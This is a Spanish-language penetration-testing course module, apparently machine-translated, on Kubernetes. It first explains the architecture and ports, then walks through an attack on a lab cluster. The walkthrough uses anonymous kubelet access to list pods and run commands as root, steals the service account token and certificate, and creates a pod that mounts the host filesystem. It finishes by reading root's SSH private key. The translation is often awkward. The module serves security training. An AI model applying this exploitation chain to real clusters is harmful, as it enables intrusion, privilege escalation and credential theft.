# Kubernetes

---

[Kubernetes](https://kubernetes.io/), también conocido como`K8s`, se destaca como una tecnología revolucionaria que ha tenido un impacto significativo en el panorama de desarrollo de software. Esta plataforma ha transformado por completo el proceso de implementación y gestión de aplicaciones, proporcionando un enfoque más eficiente y simplificado. Al ofrecer una arquitectura de código abierto, Kubernetes ha sido diseñado específicamente para facilitar la implementación, escala y gestión de contenedores de aplicaciones más rápidos y directos.

Desarrollado por Google, Kubernetes aprovecha más de una década de experiencia en la ejecución de cargas de trabajo complejas. Como resultado, se ha convertido en una herramienta crítica en el universo DevOps para la orquestación de microservicios. Desde su creación, Kubernetes ha sido donado al[Cloud Native Computing Foundation](https://www.cncf.io/), donde se ha convertido en el estándar de oro de la industria. Comprender los aspectos de seguridad de los contenedores K8 es crucial. Probablemente podremos acceder a uno de los muchos contenedores durante nuestra prueba de penetración.

Una de las características clave de Kubernetes es su adaptabilidad y compatibilidad con varios entornos. Esta plataforma ofrece una amplia gama de características que permiten a los desarrolladores y administradores de sistemas configurar, automatizar y escalar fácilmente sus implementaciones y aplicaciones. Como resultado, Kubernetes se ha convertido en una solución de referencia para las organizaciones que buscan optimizar sus procesos de desarrollo y mejorar la eficiencia.

Kubernetes es un sistema de orquestación de contenedores, que funciona al ejecutar todas las aplicaciones en contenedores aislados desde el sistema de host hasta`multiple layers of protection`. Este enfoque asegura que las aplicaciones no se vean afectadas por los cambios en el sistema de host, como actualizaciones o parches de seguridad. La arquitectura K8S comprende un`master node`y`worker nodes`, cada uno con roles específicos.

---

## Concepto de K8s

Kubernetes gira en torno al concepto de vainas, que pueden contener uno o más contenedores estrechamente conectados. Cada POD funciona como una máquina virtual separada en un nodo, completa con su propio IP, nombre de host y otros detalles. Kubernetes simplifica la gestión de múltiples contenedores al ofrecer herramientas para el equilibrio de carga, el descubrimiento de servicios, la orquestación de almacenamiento, la autocuración y más. A pesar de los desafíos en la seguridad y la gestión, K8s continúa creciendo y mejorando con características como`Role-Based Access Control` (`RBAC`), `Network Policies`, y`Security Contexts`, proporcionando un entorno más seguro para aplicaciones.

Diferencias entre K8 y Docker

|**Función**|**Estibador**|**Kubernetes**|
|---|---|---|
|`Primary`|Plataforma para contenedores de aplicaciones|Una herramienta de orquestación para administrar contenedores|
|`Scaling`|Escalado manual con Docker Swarm|Escala automática|
|`Networking`|Red única|Red compleja con políticas|
|`Storage`|Volúmenes|Amplia gama de opciones de almacenamiento|

La arquitectura de Kubernetes se divide principalmente en dos tipos de componentes:

- `The Control Plane`(nodo maestro), que es responsable de controlar el clúster de Kubernetes
    
- `The Worker Nodes`(Minions), donde se ejecutan las aplicaciones contenedoras
    

#### Nodos

El nodo maestro aloja los Kubernetes`Control Plane`, que administra y coordina todas las actividades dentro del clúster y también asegura que se mantenga el estado deseado del clúster. Por otro lado, el`Minions`Ejecute las aplicaciones reales y reciben instrucciones del plano de control y asegúrese de que se logre el estado deseado.

Cubre la versatilidad para acomodar diversas necesidades, como las bases de datos de soporte, las cargas de trabajo AI/ML y los microservicios nativos de la nube. Además, es capaz de administrar aplicaciones de alta recursos en el borde y es compatible con diferentes plataformas. Por lo tanto, se puede utilizar en servicios públicos en la nube como Google Cloud, Azure y AWS o dentro de los centros de datos locales privados.

#### Avión de control

El plano de control sirve como la capa de gestión. Consiste en varios componentes cruciales, que incluyen:

|**Servicio**|**Puertos TCP**|
|---|---|
|`etcd`|`2379`, `2380`|
|`API server`|`6443`|
|`Scheduler`|`10251`|
|`Controller Manager`|`10252`|
|`Kubelet API`|`10250`|
|`Read-Only Kubelet API`|`10255`|

Estos elementos habilitan el`Control Plane`tomar decisiones y proporcionar una visión integral de todo el clúster.

#### Secuaces

Dentro de un entorno contenedorizado, el`Minions`(Nodos de trabajadores) sirven como la ubicación designada para ejecutar aplicaciones. Es importante tener en cuenta que cada nodo es administrado y regulado por el plano de control, lo que ayuda a garantizar que todos los procesos que se ejecutan dentro de los contenedores funcionen de manera suave y eficiente.

El`Scheduler`, basado en el`API server`, comprende el estado del clúster y programa nuevos vainas en los nodos en consecuencia. Después de decidir en qué nodo debe ejecutarse un POD, el servidor API actualiza el`etcd`.

Comprender cómo interactúan estos componentes es esencial para comprender el funcionamiento de los kubernetes. El servidor API es el punto de entrada para todos los comandos administrativos, ya sea de los usuarios a través de Kubectl o de los controladores. Este servidor se comunica con ETCD para obtener o actualizar el estado del clúster.

#### Medidas de seguridad de K8

La seguridad de Kubernetes se puede dividir en varios dominios:

- Seguridad de la infraestructura de clúster
- Seguridad de configuración de clúster
- Seguridad de la aplicación
- Seguridad de datos

Cada dominio incluye múltiples capas y elementos que deben ser asegurados y administrados adecuadamente por los desarrolladores y administradores.

---

## API de Kubernetes

El núcleo de la arquitectura de Kubernetes es su API, que sirve como el principal punto de contacto para todas las interacciones internas y externas. La API de Kubernetes ha sido diseñada para admitir el control declarativo, lo que permite a los usuarios definir su estado deseado para el sistema. Esto permite a Kubernetes tomar las medidas necesarias para implementar el estado deseado. El Kube-Apiserver es responsable de alojar la API, que maneja y verifica solicitudes de reparación para modificar el estado del sistema. Estas solicitudes pueden implicar crear, modificar, eliminar y recuperar información relacionada con varios recursos dentro del sistema. En general, la API de Kubernetes juega un papel crucial en facilitar la comunicación y el control sin problemas dentro del clúster Kubernetes.

Dentro del marco de Kubernetes, un recurso API sirve como punto final que alberga una colección específica de objetos API. Estos objetos se refieren a una categoría particular e incluyen elementos esenciales como vainas, servicios e implementaciones, entre otros. Cada recurso único viene equipado con un conjunto distintivo de operaciones que se pueden ejecutar, que incluyen, entre otros::

|**Pedido**|**Descripción**|
|---|---|
|`GET`|Recupera información sobre un recurso o una lista de recursos.|
|`POST`|Crea un nuevo recurso.|
|`PUT`|Actualiza un recurso existente.|
|`PATCH`|Aplica actualizaciones parciales a un recurso.|
|`DELETE`|Elimina un recurso.|

#### Autenticación

En términos de autenticación, Kubernetes admite varios métodos, como certificados de cliente, tokens portadores, un proxy de autenticación o autores básicos HTTP, que sirven para verificar la identidad del usuario. Una vez que el usuario ha sido autenticado, Kubernetes aplica decisiones de autorización utilizando el control de acceso basado en roles (`RBAC`). Esta técnica implica asignar roles específicos a usuarios o procesos con permisos correspondientes para acceder y operar en recursos. Por lo tanto, el proceso de autenticación y autorización de Kubernetes es una medida de seguridad integral que garantiza que solo los usuarios autorizados puedan acceder a recursos y realizar operaciones.

En Kubernetes, el`Kubelet`se puede configurar para permitir`anonymous access`. Por defecto, el kubelet permite el acceso anónimo. Las solicitudes anónimas se consideran no autenticadas, lo que implica que cualquier solicitud realizada al kubelet sin un certificado de cliente válido será tratada como anónima. Esto puede ser problemático ya que cualquier proceso o usuario que pueda llegar a la API de Kubelet puede hacer solicitudes y recibir respuestas, potencialmente exponer información confidencial o conducir a acciones no autorizadas.

#### Interacción del servidor API de K8

  Kubernetes

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```

`System:anonymous`Por lo general, representa a un usuario no autenticado, lo que significa que no hemos proporcionado credenciales válidas o estamos tratando de acceder al servidor API de forma anónima. En este caso, intentamos acceder a la ruta de la raíz, lo que otorgaría un control significativo sobre el clúster de Kubernetes si tiene éxito. Por defecto, el acceso a la ruta raíz generalmente está restringido a usuarios autenticados y autorizados con privilegios administrativos y el servidor API denegó la solicitud, respondiendo con un`403 Forbidden`Código de estado en consecuencia.

#### API de Kubelet - Capas de extracción

  Kubernetes

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"nginx\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:ports": {
					...SNIP...
```

La información que se muestra en la salida incluye el`names`, `namespaces`, `creation timestamps`, y`container images`de las vainas. También muestra el`last applied configuration`Para cada cápsula, que podría contener detalles confidenciales sobre las imágenes del contenedor y sus políticas de extracción.

Comprender las imágenes del contenedor y sus versiones utilizadas en el clúster pueden permitirnos identificar vulnerabilidades conocidas y explotarlas para obtener acceso no autorizado al sistema. La información del espacio de nombres puede proporcionar información sobre cómo se organizan las cápsulas y los recursos dentro del clúster, que podemos usar para dirigir espacios de nombres específicos con vulnerabilidades conocidas. También podemos usar metadatos como`uid`y`resourceVersion`realizar reconocimiento y reconocer posibles objetivos para ataques adicionales. La divulgación de la última configuración aplicada puede exponer información confidencial, como contraseñas, secretos o tokens API, utilizados durante la implementación de las cápsulas.

Podemos analizar más a fondo las cápsulas con el siguiente comando:

#### Kubeletctl - Extracción de vainas

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
```

Para interactuar de manera efectiva con las cápsulas dentro del entorno Kubernetes, es importante tener una comprensión clara de los comandos disponibles. Un enfoque que puede ser particularmente útil es utilizar el`scan rce`mandar`kubeletctl`. Este comando proporciona ideas valiosas y permite una gestión eficiente de los POD.

#### Kubelet API - Comandos disponibles

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
```

También es posible que nos involucremos con un contenedor de manera interactiva y obtengan información sobre el alcance de nuestros privilegios dentro de él. Esto nos permite comprender mejor nuestro nivel de acceso y control sobre el contenido del contenedor.

#### API de Kubelet - Ejecución de comandos

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

La salida del comando muestra que el usuario actual que ejecuta el`id`El comando dentro del contenedor tiene privilegios raíz. Esto indica que hemos obtenido acceso administrativo dentro del contenedor, lo que podría conducir a vulnerabilidades de escalada de privilegios. Si obtenemos acceso a un contenedor con privilegios raíz, podemos realizar más acciones en el sistema host u otros contenedores.

---

## Escalada de privilegios

Para obtener mayores privilegios y acceder al sistema de host, podemos utilizar una herramienta llamada[kubelettl](https://github.com/cyberark/kubeletctl)Para obtener la cuenta de servicio de Kubernetes`token`y`certificate` (`ca.crt`) del servidor. Para hacer esto, debemos proporcionar la dirección IP del servidor, el espacio de nombres y el POD de destino. En caso de que obtengamos este token y certificado, podemos elevar aún más nuestros privilegios, movernos horizontalmente por todo el clúster o obtener acceso a pods y recursos adicionales.

#### API Kubelet - Tokens de extracción

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

#### API de Kubelet - Extracción de certificados

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

Ahora que tenemos ambos`token`y`certificate`, podemos verificar los derechos de acceso en el clúster Kubernetes. Esto se usa comúnmente para la auditoría y la verificación para garantizar que los usuarios tengan el nivel correcto de acceso y no se les da más privilegios de los que necesitan. Sin embargo, podemos usarlo para nuestros fines y podemos preguntar a K8 si tenemos permiso para realizar diferentes acciones en diversos recursos.

#### Privilegios de lista

  Kubernetes

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Aquí podemos ver algunas información muy importante. Además de los recursos de autosubjetos podemos`get`, `create`, y`list`Pods que son los recursos que representan el contenedor en ejecución en el clúster. De aquí en adelante, podemos crear un`YAML`Archivo que podemos usar para crear un nuevo contenedor y montar todo el sistema de archivos raíz desde el sistema de host en este contenedor`/root`directorio. A partir de ahí, podríamos acceder a los archivos y directorios de sistemas host. El`YAML`El archivo podría parecer seguir:

#### Pod yaml

Código:yaml

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Una vez creado, ahora podemos crear el nuevo POD y verificar si se está ejecutando como se esperaba.

#### Creando una nueva vaina

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

Si el POD se está ejecutando, podemos ejecutar el comando y podríamos generar un shell inverso o recuperar datos confidenciales como la tecla SSH privada del usuario raíz.

#### Extraer la tecla SSH de Root

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```